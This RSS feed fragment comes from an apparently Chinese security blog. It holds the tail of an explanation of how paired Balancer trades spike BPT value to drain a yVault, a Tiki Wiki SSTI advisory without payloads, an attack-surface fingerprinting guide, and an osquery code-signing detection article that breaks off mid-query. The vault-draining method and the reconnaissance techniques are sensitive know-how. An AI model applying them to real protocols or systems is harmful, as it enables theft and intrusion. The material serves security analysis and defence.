&lt;/h2&gt;&lt;p&gt;由于初始版本与Balancer集成，我们需要了解Balancer的工作原理。Balancer通过激励理性市场参与者来消除流动性提供者手动重新平衡投资组合的需求。如果代币价格上涨，资金池将失去平衡。&lt;/p&gt;
&lt;p&gt;图1展示了基于Balancer池状态和发送代币数量计算接收代币数量的公式。我们以MUSD/USDC 50/50池为例，交换费率为0.05%。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/**********************************************************************************************
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// calcOutGivenIn                                                          //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// aO = tokenAmountOut                                                     //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// bO = tokenBalanceOut                                                    //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// bI = tokenBalanceIn              /      /            bI             \    (wI / wO) \      //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// aI = tokenAmountIn    aO = bO * |  1 - | --------------------------  | ^            |     //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// wI = tokenWeightIn               \      \ ( bI + ( aI * ( 1 - sF )) /              /      //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// wO = tokenWeightOut                                                    //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;// sF = swapFee                                                           //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;**********************************************************************************************/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;假设资金池当前失衡，包含1,100,000 USDC和900,000 MUSD。如果理性市场参与者支付90,000 MUSD，他们将获得99,954 USDC，盈利9,954 USDC。而当资金池平衡时(1,000,000 USDC和1,000,000 MUSD)，非理性市场参与者支付100,000 USDC将仅获得90,867 MUSD，亏损9,133 MUSD。&lt;/p&gt;
&lt;p&gt;将这两笔交易配对会产生有趣的现象。用户先进行&amp;quot;坏交易&amp;quot;(100,000 USDC→90,867 MUSD，亏损9,133 USD)，再进行&amp;quot;好交易&amp;quot;(90,867 MUSD→99,908 USDC，盈利9,041 USD)，净亏损仅92 USD。在此过程中，BPT估值会出现瞬间峰值，这正是漏洞的关键所在。&lt;/p&gt;
&lt;p&gt;将此过程应用于yVault：在&amp;quot;坏交易&amp;quot;前，金库持有价值X美元的BPT；&amp;ldquo;好交易&amp;quot;后，BPT价值略增至X+Δ。但在两笔交易之间，BPT价值会短暂激增。由于yUSDC价值与BPT直接相关，如果在&amp;quot;坏交易&amp;quot;前买入yUSDC并在&amp;quot;好交易&amp;quot;前卖出，就能瞬时获利。重复此操作可耗尽金库。&lt;/p&gt;
&lt;h2 id=&#34;如何修复&#34;&gt;如何修复？
&lt;/h2&gt;&lt;p&gt;准确计算BPT真实价值并防止攻击者从滑点中获利是个难题。开发者Andre部署了新策略，简单地将USDC转换为MUSD并存入mStable储蓄账户。&lt;/p&gt;
&lt;h2 id=&#34;未来建议&#34;&gt;未来建议
&lt;/h2&gt;&lt;p&gt;DeFi组合性很复杂，容易意外暴露新协议于风险中。集成多个代币时，任一代币都可能危及整个平台安全；集成多个平台时，协议可能遭受复杂交互影响。&lt;/p&gt;
&lt;p&gt;安全工具可帮助预防大多数简单代码漏洞：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Crytic使用高级版Slither自动检测多达90种漏洞类型&lt;/li&gt;
&lt;li&gt;Echidna通过模糊测试断言特定属性&lt;/li&gt;
&lt;li&gt;Manticore可对代码进行符号分析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然，工具不是安全的万能药。研究表明即使技术显著改进，近50%的问题仍难以通过工具检测。对于复杂代码库和DeFi项目，建议安排安全评估或参加我们的以太坊安全办公时间。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[CVE-2025-32461] Tiki Wiki CMS Groupware &lt;=28.3版本存在两个SSTI漏洞</title>
        <link>http://localhost:1313/p/cve-2025-32461-tiki-wiki-cms-groupware-28.3%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8%E4%B8%A4%E4%B8%AAssti%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sun, 03 Aug 2025 07:16:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/cve-2025-32461-tiki-wiki-cms-groupware-28.3%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8%E4%B8%A4%E4%B8%AAssti%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;p&gt;[CVE-2025-32461] Tiki Wiki CMS Groupware &amp;lt;=28.3版本的两个SSTI漏洞&lt;/p&gt;
&lt;p&gt;安全研究人员在Tiki Wiki CMS Groupware内容管理系统28.3及更早版本中发现了两处严重的服务器端模板注入(Server-Side Template Injection)漏洞。这些漏洞存在于系统的模板处理组件中，未经认证的攻击者可能通过精心构造的恶意输入实现远程代码执行。&lt;/p&gt;
&lt;p&gt;技术细节显示，第一个漏洞(CVE-2025-32461-1)影响Smarty模板引擎的特定过滤逻辑，而第二个漏洞(CVE-2025-32461-2)则涉及系统对用户提供数据的处理方式。当攻击者向特定端点提交特制payload时，系统会错误地将其解析为可执行代码。&lt;/p&gt;
&lt;p&gt;研究人员已在karmainsecurity.com发布完整的技术分析报告，包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;漏洞触发条件的具体调用栈分析&lt;/li&gt;
&lt;li&gt;受影响版本的完整列表&lt;/li&gt;
&lt;li&gt;概念验证(PoC)利用代码片段&lt;/li&gt;
&lt;li&gt;临时缓解措施建议&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;目前Tiki Wiki开发团队尚未发布官方补丁。建议所有使用受影响版本的用户立即采取以下措施：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;禁用不必要的模板编辑功能&lt;/li&gt;
&lt;li&gt;对用户输入实施更严格的过滤&lt;/li&gt;
&lt;li&gt;监控服务器日志中的可疑模板解析行为&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该漏洞的CVSSv3评分为9.8(严重级别)，特别需要注意的是，利用这些漏洞不需要任何先验认证。安全社区正在密切关注该漏洞的进一步发展和官方修复进度。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>攻击面资产分类实践指南：从DNS记录到HTML分析的全面技术解析</title>
        <link>http://localhost:1313/p/%E6%94%BB%E5%87%BB%E9%9D%A2%E8%B5%84%E4%BA%A7%E5%88%86%E7%B1%BB%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%E4%BB%8Edns%E8%AE%B0%E5%BD%95%E5%88%B0html%E5%88%86%E6%9E%90%E7%9A%84%E5%85%A8%E9%9D%A2%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 07:05:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%94%BB%E5%87%BB%E9%9D%A2%E8%B5%84%E4%BA%A7%E5%88%86%E7%B1%BB%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%E4%BB%8Edns%E8%AE%B0%E5%BD%95%E5%88%B0html%E5%88%86%E6%9E%90%E7%9A%84%E5%85%A8%E9%9D%A2%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;攻击面中每项资产的分类实践指南&#34;&gt;攻击面中每项资产的分类实践指南
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;TLDR&lt;/strong&gt;：本文详述了从业者可用于分类攻击面中每个Web应用和资产的方法与工具（从DNS记录、IP地址到HTTP分析和HTML内容）。您将学习从攻击者视角审视资产，不仅能识别资产存在，还能精确判断其性质。&lt;/p&gt;
&lt;h2 id=&#34;资产分类的必要性&#34;&gt;资产分类的必要性
&lt;/h2&gt;&lt;p&gt;&amp;ldquo;无法保护未知存在的资产&amp;quot;是网络安全领域的常见箴言。但现实更为复杂：仅知道某物存在并不足够。要有效保护资产，必须了解每个资产的实质。没有正确分类，安全措施和工具的应用将变成猜谜游戏。&lt;/p&gt;
&lt;p&gt;Detectify研究表明，普通企业平均会漏测90%可能成为攻击目标的复杂Web应用。关键在于：攻击者只关心实际可访问的资产，而非您认为暴露的内容。&lt;/p&gt;
&lt;h2 id=&#34;外部视角的数据采集方法&#34;&gt;外部视角的数据采集方法
&lt;/h2&gt;&lt;p&gt;本指南假设采用由外至内的黑盒分析视角（非基于内部网络数据或源代码），按典型连接流顺序介绍分类方法：&lt;/p&gt;
&lt;h3 id=&#34;握手阶段分析&#34;&gt;握手阶段分析
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;托管位置&lt;/li&gt;
&lt;li&gt;指针类型（A/CNAME/MX等记录）&lt;/li&gt;
&lt;li&gt;TXT记录信息（如SPF/DKIM/DMARC）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IP&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;地理位置&lt;/li&gt;
&lt;li&gt;自治系统号(ASN)归属&lt;/li&gt;
&lt;li&gt;独立IP或地址段归属&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;端口&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开放/关闭状态&lt;/li&gt;
&lt;li&gt;防火墙行为特征（TCP/UDP处理差异）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;协议&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端口响应协议（HTTP/FTP/SSH等）&lt;/li&gt;
&lt;li&gt;嵌套协议（如HTTP over TLS）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SSL/TLS&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;证书颁发机构(CA)&lt;/li&gt;
&lt;li&gt;JARM指纹数据&lt;/li&gt;
&lt;li&gt;主题备用名称(SANs)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;http深度分析&#34;&gt;HTTP深度分析
&lt;/h3&gt;&lt;p&gt;重点解析Web应用核心协议HTTP的关键数据点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;响应代码&lt;/strong&gt;：200 OK/30X重定向/50X服务器错误&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;响应头&lt;/strong&gt;：X-自定义头/Cookie/安全头信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件签名&lt;/strong&gt;：响应体前几字节的二进制特征&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内容类型与长度&lt;/strong&gt;：JSON/XML/HTML等格式识别&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;html层解析&#34;&gt;HTML层解析
&lt;/h3&gt;&lt;p&gt;当响应为HTML时可获取更丰富信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Favicon哈希&lt;/strong&gt;：快速识别已知软件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;URL模式&lt;/strong&gt;：如/wp-admin/等特征路径&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Meta标签&lt;/strong&gt;：generator等属性暴露CMS信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;表单结构&lt;/strong&gt;：登录表单字段揭示系统类型&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码特征&lt;/strong&gt;：JS/HTML/CSS中的框架指纹&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三方资源&lt;/strong&gt;：引用的外部脚本/API来源&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;工具与技术实现&#34;&gt;工具与技术实现
&lt;/h2&gt;&lt;h3 id=&#34;dns分析&#34;&gt;DNS分析
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;小规模：&lt;code&gt;dig&lt;/code&gt;命令+人工模式识别&lt;/li&gt;
&lt;li&gt;大规模：MassDNS等开源工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ip端口扫描&#34;&gt;IP/端口扫描
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;精准扫描：Nmap（支持服务检测）&lt;/li&gt;
&lt;li&gt;大规模扫描：Zmap/MASSCAN（速度优先）&lt;/li&gt;
&lt;li&gt;ASN查询：Whois命令行/在线工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;协议识别&#34;&gt;协议识别
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;标准工具：Nmap&lt;/li&gt;
&lt;li&gt;高级指纹：JA4T（TLS指纹）/fingerprintx&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ssltls解析&#34;&gt;SSL/TLS解析
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;JARM主动探测工具&lt;/li&gt;
&lt;li&gt;证书透明度日志（如crt.sh）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;http特征提取&#34;&gt;HTTP特征提取
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;状态码分析&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;30X重定向暴露服务器类型（如nginx）&lt;/li&gt;
&lt;li&gt;40X/50X错误触发特定系统响应&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;响应头检测&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Server/X-Powered-By等显性标记&lt;/li&gt;
&lt;li&gt;CSP策略分析依赖资源（如Salesforce）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内容检测&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;file&lt;/code&gt;/&lt;code&gt;xxd&lt;/code&gt;命令分析文件签名&lt;/li&gt;
&lt;li&gt;Content-Type+Length组合识别应用类型&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;html指纹库&#34;&gt;HTML指纹库
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Favicon哈希&lt;/strong&gt;：Shodan等平台预置库&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;路径爆破&lt;/strong&gt;：ffuf/dirsearch等工具配合字典&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;元标签抓取&lt;/strong&gt;：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;generator&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;WordPress 6.2.2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码语法树分析&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Tree-sitter解析JavaScript AST&lt;/li&gt;
&lt;li&gt;ANTLR处理GraphQL等复杂语法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;综合分类实践&#34;&gt;综合分类实践
&lt;/h2&gt;&lt;p&gt;通过组合多维度数据点可回答关键安全问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DNS端点是否过时？&lt;/li&gt;
&lt;li&gt;是否遵守内部证书颁发策略？&lt;/li&gt;
&lt;li&gt;重定向配置是否正确？&lt;/li&gt;
&lt;li&gt;CMDB是否与实际暴露面一致？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;系统化的资产分类使安全团队超越简单发现，实现深度理解和测试。部分工具可自动化分类过程，并智能推荐需重点测试的高风险资产。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用osquery追踪被盗代码签名证书的技术解析</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8osquery%E8%BF%BD%E8%B8%AA%E8%A2%AB%E7%9B%97%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 06:54:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8osquery%E8%BF%BD%E8%B8%AA%E8%A2%AB%E7%9B%97%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;使用osquery追踪被盗代码签名证书&#34;&gt;使用osquery追踪被盗代码签名证书
&lt;/h1&gt;&lt;p&gt;近期，270万台Windows计算机因运行了通过CCleaner软件更新机制分发的恶意软件而感染，该恶意软件使用了从CCleaner开发者处窃取的代码签名证书进行签名。幸运的是，得益于同事Alessandro Gario提交的拉取请求（为osquery新增了Windows可执行文件代码签名验证功能，即Authenticode），检测此类签名恶意软件现已变得简单。本文将探讨代码签名在事件响应中的重要性，并通过实际案例演示这一新功能的用途。&lt;/p&gt;
&lt;h2 id=&#34;代码签名恶意软件的威胁&#34;&gt;代码签名恶意软件的威胁
&lt;/h2&gt;&lt;p&gt;代码签名本应防止可执行文件被恶意篡改，并允许用户（或平台所有者）选择是否运行来自非信任源的代码。然而，在Windows等通用计算平台上，第三方软件供应商需自行保护其代码签名证书。攻击者意识到，只需窃取其中一个证书即可为恶意软件签名，使其看似来自合法供应商。这种现象（以及著名的Stuxnet事件）催生了使用被盗证书签名恶意软件的趋势，并成为近年来犯罪和国家级攻击的常规手段，最近的案例便是CCleaner的受感染更新。&lt;/p&gt;
&lt;p&gt;防御者已意识到，依赖“所有第三方供应商都能保护其签名证书”的信任模型并不可靠。在Windows等平台上，代码签名仅能作为薄弱的信任标记或应用白名单机制。但代码签名还有另一用途：事件响应。一旦确认某签名证书被盗，它即可作为明确的入侵指标（IoC）。防御者可借此搜索网络中其他使用该证书签名的可执行文件——即使恶意软件绕过了杀毒软件，被盗证书的签名检查也能以0误报率精准定位威胁。osquery正是执行此类搜索的理想工具。&lt;/p&gt;
&lt;h2 id=&#34;通过osquery验证authenticode签名&#34;&gt;通过osquery验证Authenticode签名
&lt;/h2&gt;&lt;p&gt;osquery通过“表”的形式新增传感器功能，将系统信息抽象为SQL表。添加新表需先定义其规范（schema），包括列名、数据类型及简短描述。Alessandro的拉取请求为Windows新增了&lt;code&gt;authenticode&lt;/code&gt;虚拟表，包含以下列：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;path&lt;/code&gt;：文件路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;original_program_name&lt;/code&gt;：发布者名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;serial_number&lt;/code&gt;：证书序列号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;subject_name&lt;/code&gt;：主题名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;result&lt;/code&gt;：验证结果&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;签名验证通过系统API &lt;code&gt;WinVerifyTrust()&lt;/code&gt;实现，代码位于&lt;code&gt;osquery/tables/system/windows/authenticode.cpp&lt;/code&gt;。以下为检查Windows可执行文件签名的简化示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\Windows\explorer.exe&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;result&lt;/code&gt;列的可能值及含义：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;状态&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;missing&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;文件无签名。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;invalid&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;签名无效（文件缺失或损坏）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;untrusted&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;签名无法通过验证。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;distrusted&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;有效签名，但被用户显式标记为不信任。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;valid&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;有效签名，但未被用户显式信任。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;trusted&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;有效签名且受用户信任。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;使用sql优化osquery查询结果&#34;&gt;使用SQL优化osquery查询结果
&lt;/h2&gt;&lt;p&gt;通过与其他系统表联查（JOIN），可显著提升监控效率。例如，以下查询列出所有未签名进程，减少无关噪音：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;osquery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 